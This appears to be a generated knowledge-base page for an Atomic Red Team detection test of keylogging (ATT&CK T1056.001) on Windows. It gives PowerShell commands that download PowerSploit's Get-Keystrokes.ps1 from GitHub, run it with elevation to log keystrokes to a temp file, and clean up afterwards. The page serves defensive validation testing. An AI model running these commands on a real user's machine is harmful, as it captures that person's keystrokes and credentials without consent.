---
atomic_guid: "d9b633ca-8efb-45e6-b838-70f595c6ae26"
title: "Input Capture"
framework: "atomic"
generated: "true"
attack_technique_id: "T1056.001"
attack_technique_name: "Input Capture: Keylogging"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "d9b633ca-8efb-45e6-b838-70f595c6ae26"
  - "Input Capture"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Input Capture

Utilize PowerShell and external resource to capture keystrokes
[Payload](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/src/Get-Keystrokes.ps1)
Provided by [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-Keystrokes.ps1)

Upon successful execution, Powershell will execute `Get-Keystrokes.ps1` and output to key.log.

## Metadata

- Atomic GUID: d9b633ca-8efb-45e6-b838-70f595c6ae26
- Technique: T1056.001: Input Capture: Keylogging
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Source Path: atomics/T1056.001/T1056.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1056-input_capture|T1056.001]]

## Input Arguments

### filepath

- description: Name of the local file, include path.
- type: path
- default: $env:TEMP\key.log

## Dependencies

Get-Keystrokes PowerShell script must exist on disk at PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1

### Prerequisite Check

```untitled
if (Test-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1") {exit 0} else {exit 1}
```

### Get Prerequisite

```untitled
New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1") -Force | Out-Null
Invoke-WebRequest https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1056.001/src/Get-Keystrokes.ps1 -OutFile "PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
&"$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1" -LogPath #{filepath}
```

### Cleanup

```powershell
Remove-Item $env:TEMP\key.log -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056.001/T1056.001.yaml)
